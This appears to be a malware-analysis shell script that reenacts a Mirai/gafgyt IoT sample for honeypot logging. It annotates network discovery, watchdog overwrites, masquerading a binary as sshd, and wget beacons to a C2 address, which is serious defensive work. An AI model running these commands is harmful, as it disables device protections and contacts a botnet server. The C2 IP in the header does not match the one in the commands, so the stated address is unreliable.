#!/bin/sh
# =============================================================================
# RECONSTRUCTED MALWARE BEHAVIOUR — NOT THE ORIGINAL BINARY
# =============================================================================
# Family:       Mirai / gafgyt variant
# Architecture: Mipsel (MIPS Little-Endian)
# SHA256:       2f8dcc5f1bdebcce0408dbb5fcc1601ae9ad4d9fce01d0398eb78f44f8a7390f
# Source:       MalwareBazaar - analysed in: https://tria.ge/260325-whck9sfx5l/behavioral1
# Analysed via: tria.ge — debian-9_mipsel — static score: 5/10 - dynamic score: 7/10
# MITRE ATT&CK: T1562 (Impair Defenses), T1016 (System Network Configuration Discovery) - T1016.001 (Internet Connection Discovery)
# C2:           172.145.210.119:20129 TCP
# =============================================================================


# PHASE 1 — DISCOVERY (T1016.001: Internet Connection Discovery)
# Observed: malware reads /proc/net/route on startup
# Purpose:  enumerate active network interfaces and routing table
#           to identify available network paths before beaconing
# IoCs:     /proc/net/route confirmed in tria.ge file reads
# Reference: https://attack.mitre.org/versions/v16/techniques/T1016/001/
cat /proc/net/route

# PHASE 2 — DEFENCE EVASION (T1562: Impair Defenses)
# Observed: malware opens multiple watchdog device files for read then write
# Purpose:  prevent hardware watchdog timer from rebooting the infected device
#           consistent with Mirai family behaviour on embedded/IoT targets
# IoCs:     /dev/watchdog, /dev/misc/watchdog, /dev/watchdog0,
#           /bin/watchdog, /etc/watchdog confirmed in tria.ge file writes
# Note:     read before write suggests the binary checks device existence
#           before attempting to disable it
# Reference: https://attack.mitre.org/versions/v16/techniques/T1562/
echo '' > /dev/watchdog
echo '' > /dev/misc/watchdog
echo '' > /dev/watchdog0
echo '' > /bin/watchdog
echo '' > /etc/watchdog

# PHASE 3 — DEFENCE EVASION (Process Name Masquerading)
# Observed: PID 711 renamed to sshd via binary-level prctl()/argv[0] manipulation
# Purpose:  blend into normal process list to evade manual inspection
# Note:     this is a compiled binary behaviour, not shell-reproducible.
#           Approximated here by copying binary under legitimate process name.
# IoCs:     process rename to sshd confirmed in tria.ge signatures
cp /tmp/2f8dcc5f1bdebcce0408dbb5fcc1601ae9ad4d9fce01d0398eb78f44f8a7390f.elf /tmp/sshd
/tmp/sshd &

# PHASE 4 — C2 BEACON
# Observed: 83 TCP flows to 172.245.210.119:20129 at ~20 second intervals
#           confirmed in analog log (flow 1 at t=3937ms, flow 2 at t=24086ms etc.)
#           rx_bytes consistently 40 per flow — server acknowledgement only
#           tx_bytes mostly 60 (single packet) with occasional 240 (4 packets)
#           suggesting periodic re-registration or keepalive bursts
# Note:     Cowrie cannot simulate raw TCP sockets.
#           wget approximates the outbound C2 connection for logging purposes.
#           The actual binary used a direct socket — not HTTP.
#           Three discrete wget calls represent the beacon pattern.
# Reference: Port 20129 consistent with Mirai-family C2 listener
wget http://172.245.210.119:20129/
wget http://172.245.210.119:20129/
wget http://172.245.210.119:20129/
